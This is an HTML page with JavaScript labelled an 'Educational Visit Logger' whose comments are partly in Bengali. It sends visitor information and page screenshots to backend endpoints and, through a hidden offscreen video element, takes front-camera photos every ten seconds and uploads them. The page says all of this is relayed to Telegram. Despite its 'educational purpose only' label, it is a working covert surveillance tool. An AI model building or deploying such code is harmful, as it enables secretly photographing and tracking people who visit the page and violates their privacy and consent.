<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Educational Logger</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <style>
    body { 
      text-align: center; 
      margin-top: 100px; 
      font-family: Arial, sans-serif; 
      background: #f8f9fa; 
      color: #333;
    }
    h2 { color: #222; margin-bottom: 10px; }
    p { max-width: 700px; margin: 0 auto 30px; color: #555; }
    button { 
      padding: 14px 32px; 
      margin: 12px 10px; 
      font-size: 17px; 
      cursor: pointer; 
      border: none; 
      border-radius: 8px; 
      color: white;
      transition: all 0.2s;
    }
    button.primary { background: #28a745; }
    button.primary:hover { background: #218838; }
    button.stop { background: #dc3545; }
    button.stop:hover { background: #c82333; }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    #status { font-size: 16px; color: #555; margin: 20px; }
    #hiddenVideo {
      display: none;
      position: absolute;
      left: -9999px;
      top: -9999px;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>

  <h2>Educational Visit Logger</h2>
  <p>Educational purpose only — all actions sent to Telegram.</p>

  <button class="primary" onclick="sendData()">I Agree & Send Info</button>
  <button class="primary" onclick="captureAndSendScreenshot()">Take Screenshot & Send 📸</button>

  <br><br>

  <button class="primary" id="startContinuousBtn" onclick="startContinuousHiddenPhotos()">
    Start Continuous Hidden Photos (every 10s)
  </button>

  <button class="stop" id="stopContinuousBtn" onclick="stopContinuousPhotos()" style="display:none;">
    Stop Sending Photos
  </button>

  <div id="status"></div>

  <video id="hiddenVideo" autoplay playsinline muted></video>

  <script>
    // আগের ফাংশনগুলো
    async function sendData() {
      try {
        const res = await fetch("/api/send", { method: "POST" });
        const data = await res.json();
        alert(data.success ? "Info Sent ✅" : "Failed ❌");
      } catch {
        alert("Error");
      }
    }

    async function captureAndSendScreenshot() {
      try {
        const canvas = await html2canvas(document.body, { scale: 2 });
        const base64 = canvas.toDataURL("image/png");
        const res = await fetch("/api/send-screenshot", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64 })
        });
        const data = await res.json();
        alert(data.success ? "Screenshot Sent ✅" : "Failed ❌");
      } catch (err) {
        alert("Screenshot error: " + err.message);
      }
    }

    // Continuous mode (প্রতি ১০ সেকেন্ডে নতুন ছবি)
    const startBtn = document.getElementById('startContinuousBtn');
    const stopBtn = document.getElementById('stopContinuousBtn');
    const statusDiv = document.getElementById('status');
    let contStream = null;
    let contVideo = document.getElementById('hiddenVideo');
    let contIntervalId = null;
    let photoCounter = 0;

    async function startContinuousHiddenPhotos() {
      if (contIntervalId) {
        alert("Already running. Stop first if needed.");
        return;
      }

      startBtn.disabled = true;
      startBtn.textContent = "Starting... 📷";

      try {
        contStream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 640 },
            height: { ideal: 480 }
          },
          audio: false
        });

        contVideo.srcObject = contStream;

        await new Promise((resolve, reject) => {
          contVideo.onloadedmetadata = () => {
            contVideo.play().then(resolve).catch(reject);
          };
          contVideo.onerror = reject;
          setTimeout(() => reject(new Error("Timeout")), 2000);
        });

        if (contVideo.videoWidth === 0 || contVideo.videoHeight === 0) {
          throw new Error("No video frame");
        }

        statusDiv.textContent = "Camera started. Sending first photo now...";
        photoCounter = 0;

        // প্রথম ছবি সাথে সাথে
        await sendOneHiddenPhoto();

        // তারপর প্রতি ১০ সেকেন্ডে
        contIntervalId = setInterval(async () => {
          await sendOneHiddenPhoto();
        }, 10000);

        startBtn.style.display = 'none';
        stopBtn.style.display = 'inline-block';

      } catch (err) {
        let msg = "Failed to start.";
        if (err.name === 'NotAllowedError') msg = "Permission denied – allow camera";
        else if (err.name === 'NotFoundError') msg = "No camera";
        else msg += " " + err.message;
        alert(msg);
        console.error(err);
        resetButtons();
      }
    }

    async function sendOneHiddenPhoto() {
      photoCounter++;
      statusDiv.textContent = `Sending photo #${photoCounter}...`;

      try {
        const canvas = document.createElement('canvas');
        canvas.width = contVideo.videoWidth;
        canvas.height = contVideo.videoHeight;
        canvas.getContext('2d').drawImage(contVideo, 0, 0);

        const base64 = canvas.toDataURL('image/png');

        const res = await fetch("/api/send-photo", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64 })
        });

        const data = await res.json();

        if (data.success) {
          statusDiv.textContent = `Photo #${photoCounter} sent successfully ✅ (next in 10s)`;
        } else {
          statusDiv.textContent = `Photo #${photoCounter} failed to send ❌`;
        }

      } catch (err) {
        console.error("Photo send error:", err);
        statusDiv.textContent = `Error sending photo #${photoCounter}`;
      }
    }

    function stopContinuousPhotos() {
      if (contIntervalId) {
        clearInterval(contIntervalId);
        contIntervalId = null;
      }
      if (contStream) {
        contStream.getTracks().forEach(track => track.stop());
        contStream = null;
      }
      if (contVideo) {
        contVideo.srcObject = null;
      }
      statusDiv.textContent = `Stopped after ${photoCounter} photos.`;
      resetButtons();
    }

    function resetButtons() {
      startBtn.disabled = false;
      startBtn.textContent = "Start Continuous Hidden Photos (every 10s)";
      startBtn.style.display = 'inline-block';
      stopBtn.style.display = 'none';
    }
  </script>

</body>
</html>
